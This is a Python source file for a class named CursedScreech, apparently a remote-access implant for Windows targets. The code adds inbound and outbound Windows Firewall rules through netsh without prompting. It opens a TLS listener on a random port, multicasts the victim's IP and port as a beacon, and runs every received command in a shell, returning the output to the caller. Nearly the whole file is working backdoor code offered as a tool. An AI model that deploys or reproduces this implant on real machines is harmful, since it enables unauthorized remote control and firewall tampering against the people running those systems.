import time
import subprocess
from random import randint
import platform
import threading
import sys
from ssl import *
from socket import *

class CursedScreech:

	def __init__(self, progName):
		self.ProgName = progName
		self.msg = ""
		self.lport = 0
		self.certSerial = ""
		self.threads = []
		
	
	# ==================================================
	#        METHOD TO START THE MULTICAST THREAD
	# ==================================================
	def startMulticaster(self, addr, port, heartbeatInterval = 5):
		# Set up a heartbeat thread
		hbt = threading.Thread(target=self.sendHeartbeat, args=(addr,port,heartbeatInterval))
		self.threads.append(hbt)
		hbt.start()
		
	
	# ====================================================
	#  MULTITHREADED SECURE LISTENER WITH SHELL EXECUTION
	# ====================================================
	def startSecureServerThread(self, keyFile, certFile, remoteCert):
		sst = threading.Thread(target=self.startSecureServer, args=(keyFile,certFile,remoteCert))
		self.threads.append(sst)
		sst.start()
		
	# ========================================================
	#   METHOD TO SET THE EXPECTED CERTIFICATE SERIAL NUMBER
	# ========================================================
	def setRemoteCertificateSerial(self, serial):
		self.certSerial = serial
		
		
	# ======================================
	#           HEARTBEAT THREAD
	# ======================================
	def sendHeartbeat(self, MCAST_GROUP, MCAST_PORT, hbInterval):
		
		# Add a firewall rule in Windows to allow outbound UDP packets
		addUDPRule = "netsh advfirewall firewall add rule name=\"" + self.ProgName + "\" protocol=UDP dir=out localport=" + str(MCAST_PORT) + " action=allow";
		subprocess.call(addUDPRule, shell=True, stdout=subprocess.PIPE)
		
		# Set up a UDP socket for multicast
		sck = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)
		sck.setsockopt(IPPROTO_IP, IP_MULTICAST_TTL, 2)
		
		# Infinitely loop and send a broadcast to MCAST_GROUP with our
		# listener's IP and port information.
		while True:
			ip = gethostbyname(gethostname())
			if len(self.msg) > 0:
				sck.sendto("msg:" + self.msg, (MCAST_GROUP, MCAST_PORT))
				
				# Clear out the message
				self.msg=""
			
			sck.sendto(ip + ":" + str(self.lport), (MCAST_GROUP, MCAST_PORT))
			time.sleep(hbInterval)
	
	
	# ===================================================
	#    BLOCKING SECURE LISTENER WITH SHELL EXECUTION
	# ===================================================
	def startSecureServer(self, keyFile, certFile, remoteCert):
	
		# Create a listener for the secure shell
		ssock = socket(AF_INET, SOCK_STREAM)
		ssock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
		listener = wrap_socket(ssock, ssl_version=PROTOCOL_SSLv23, keyfile=keyFile, certfile=certFile, cert_reqs=CERT_REQUIRED, ca_certs=remoteCert)
		
		# Pick a random port number on which to listen and attempt to bind to it
		# If it is already in use simply continue the process until an available
		# port is found.
		bound = False
		while bound == False:
			self.lport = randint(30000, 65534)
			try:
				listener.bind((gethostname(), self.lport))
				bound = True
			except:
				bound = False
				continue
				
		# Set up rules in the firewall to allow connections from this program
		addTCPRule = "netsh advfirewall firewall add rule name=\"" + self.ProgName + "\" protocol=TCP dir=in localport=xxxxx action=allow";
		delFirewallRule = "netsh advfirewall firewall delete rule name=\"" + self.ProgName + "\"";
		
		try:
			# Delete old firewall rules if they exist
			subprocess.call(delFirewallRule, shell=True, stdout=subprocess.PIPE)
	
			# Add a firewall rule to Windows Firewall that allows inbound connections on the port
			addTCPRule = addTCPRule.replace('xxxxx', str(self.lport))
			subprocess.call(addTCPRule, shell=True, stdout=subprocess.PIPE)
		except:
			pass
			
		listener.listen(5)
		connected = False
		
		# Begin accepting connections and pass all commands to execShell in a separate thread
		while 1:
			if not connected:
				(client, address) = listener.accept()
				connected = True
		
				# Verify the client's certificate.  If the serial number doesn't match
				# kill the connection and wait for a new one.
				if len(self.certSerial) > 0:
					cert = client.getpeercert()
					if not cert['serialNumber'] == self.certSerial:
						connected = False
						self.msg = "[!] Unauthorized access attempt on target " + gethostbyname(gethostname()) + ":" + str(self.lport)
						continue
			while 1:
				try:
					cmd = client.recv(4096)
					
					if not len(cmd):
						connected = False
						break
						
					shellThread = threading.Thread(target=self.execShellCmd, args=(client,cmd))
					self.threads.append(shellThread)
					shellThread.start()
				except:
					connected = False
					break

		listener.close()
		
		
	# ======================================
	#         EXECUTE A CMD IN SHELL
	# ======================================
	def execShellCmd(self, sock, cmd):
		proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		stdout_value = proc.stdout.read() + proc.stderr.read()
		sock.sendall(stdout_value)
		
		